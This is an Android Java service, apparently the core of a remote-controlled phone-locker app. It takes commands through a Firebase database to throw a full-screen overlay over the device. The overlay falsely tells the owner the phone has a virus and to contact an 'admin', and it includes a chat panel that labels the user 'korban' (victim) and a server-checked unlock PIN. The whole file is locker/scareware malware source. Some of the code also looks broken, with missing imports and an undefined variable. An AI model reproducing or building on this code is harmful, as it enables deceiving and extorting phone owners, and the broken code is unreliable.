package com.moonsoul.v4;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.Nullable;
import com.google.firebase.database.*;

public class LockService extends Service {
    
    private WindowManager windowManager;
    private View overlayView;
    private DatabaseReference mDatabase;
    private String deviceId;
    private TextView tvMessage, tvChat;
    private EditText etPin, etChat;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // Dapatkan device ID unik
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        // Konek Firebase
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference();
        
        // Kirim status online ke dashboard
        mDatabase.child("devices").child(deviceId).child("status").setValue("online");
        mDatabase.child("devices").child(deviceId).child("last_seen").setValue(ServerValue.TIMESTAMP);
        
        // Listener perintah lock
        listenForCommands();
        
        // Listener chat
        listenForChat();
    }
    
    private void listenForCommands() {
        DatabaseReference commandRef = mDatabase.child("commands").child(deviceId);
        commandRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String previousChildName) {
                String command = snapshot.child("type").getValue(String.class);
                
                if ("lock".equals(command)) {
                    showLockScreen(snapshot.child("params").child("message").getValue(String.class));
                } else if ("unlock".equals(command)) {
                    hideLockScreen();
                } else if ("flash_on".equals(command)) {
                    FlashlightControl.turnOn(getApplicationContext());
                } else if ("flash_off".equals(command)) {
                    FlashlightControl.turnOff(getApplicationContext());
                } else if ("screen_lock".equals(command)) {
                    lockScreen();
                } else if ("wallpaper".equals(command)) {
                    String url = snapshot.child("params").child("url").getValue(String.class);
                    WallpaperChanger.change(getApplicationContext(), url);
                }
                
                // Hapus command setelah dijalankan
                snapshot.getRef().removeValue();
            }
            
            @Override public void onChildChanged(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onChildRemoved(DataSnapshot snapshot) {}
            @Override public void onChildMoved(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onCancelled(DatabaseError error) {}
        });
    }
    
    private void listenForChat() {
        DatabaseReference chatRef = mDatabase.child("lock_screen").child(deviceId).child("chat");
        chatRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String previousChildName) {
                String sender = snapshot.child("sender").getValue(String.class);
                String message = snapshot.child("message").getValue(String.class);
                
                if ("admin".equals(sender) && overlayView != null) {
                    // Tampilkan chat admin di overlay
                    tvChat.append("\nAdmin: " + message);
                }
            }
            
            @Override public void onChildChanged(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onChildRemoved(DataSnapshot snapshot) {}
            @Override public void onChildMoved(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onCancelled(DatabaseError error) {}
        });
    }
    
    private void showLockScreen(String message) {
        if (overlayView != null) return;
        
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        LayoutInflater inflater = LayoutInflater.from(this);
        overlayView = inflater.inflate(R.layout.overlay_lock, null);
        
        tvMessage = overlayView.findViewById(R.id.tv_message);
        tvChat = overlayView.findViewById(R.id.tv_chat);
        etPin = overlayView.findViewById(R.id.et_pin);
        etChat = overlayView.findViewById(R.id.et_chat);
        Button btnUnlock = overlayView.findViewById(R.id.btn_unlock);
        Button btnSendChat = overlayView.findViewById(R.id.btn_send_chat);
        
        tvMessage.setText(message != null ? message : "HP lo kena virus! Hubungi admin buat buka.");
        
        btnUnlock.setOnClickListener(v -> {
            String pin = etPin.getText().toString();
            checkPin(pin);
        });
        
        btnSendChat.setOnClickListener(v -> {
            String chat = etChat.getText().toString();
            if (!chat.isEmpty()) {
                // Kirim chat ke Firebase
                DatabaseReference chatRef = mDatabase.child("lock_screen").child(deviceId).child("chat").push();
                chatRef.child("sender").setValue("korban");
                chatRef.child("message").setValue(chat);
                chatRef.child("timestamp").setValue(ServerValue.TIMESTAMP);
                
                etChat.setText("");
                tvChat.append("\nKorban: " + chat);
            }
        });
        
        int layoutFlag;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
        }
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            layoutFlag,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        );
        
        params.gravity = Gravity.TOP | Gravity.START;
        windowManager.addView(overlayView, params);
        
        // Update status
        mDatabase.child("devices").child(deviceId).child("lock_status").setValue("locked");
    }
    
    private void checkPin(String pin) {
        DatabaseReference pinRef = mDatabase.child("lock_screen").child(deviceId).child("pin");
        pinRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                String correctPin = snapshot.getValue(String.class);
                if (correctPin != null && correctPin.equals(pin)) {
                    hideLockScreen();
                    
                    // Reset percobaan
                    mDatabase.child("lock_screen").child(deviceId).child("wrong_attempts").setValue(0);
                } else {
                    // Hitung percobaan salah
                    DatabaseReference attemptRef = mDatabase.child("lock_screen").child(deviceId).child("wrong_attempts");
                    attemptRef.addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(DataSnapshot snapshot) {
                            int attempts = snapshot.getValue(Integer.class) != null ? snapshot.getValue(Integer.class) : 0;
                            attempts++;
                            
                            if (attempts >= 3) {
                                // 3x salah → device mati
                                mDatabase.child("devices").child(deviceId).child("status").setValue("terminated");
                                android.os.Process.killProcess(android.os.Process.myPid());
                            } else {
                                attemptRef.setValue(attempts);
                                Toast.makeText(LockService.this, "PIN salah! Sisa " + (3-attempts) + " percobaan", Toast.LENGTH_SHORT).show();
                            }
                        }
                        
                        @Override public void onCancelled(DatabaseError error) {}
                    });
                }
            }
            
            @Override public void onCancelled(DatabaseError error) {}
        });
    }
    
    private void hideLockScreen() {
        if (overlayView != null) {
            windowManager.removeView(overlayView);
            overlayView = null;
            mDatabase.child("devices").child(deviceId).child("lock_status").setValue("unlocked");
        }
    }
    
    private void lockScreen() {
        // Lock screen resmi Android
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm.isAdminActive(componentName)) {
            dpm.lockNow();
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
            }
